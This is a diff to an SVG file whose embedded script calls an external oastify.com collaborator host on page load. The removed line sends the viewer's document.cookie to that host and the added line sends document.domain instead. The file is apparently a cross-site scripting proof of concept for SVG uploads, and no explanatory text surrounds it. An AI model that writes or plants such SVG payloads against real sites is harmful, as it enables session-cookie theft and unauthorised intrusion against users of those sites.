@@ -1,5 +1,5 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    fetch('https://2qtaimhzuudl113e15ggk9ii2980w2kr.oastify.com/?cookie=' + document.cookie)
+    fetch('https://2qtaimhzuudl113e15ggk9ii2980w2kr.oastify.com/?domain=' + document.domain)
   </script>
 </svg>
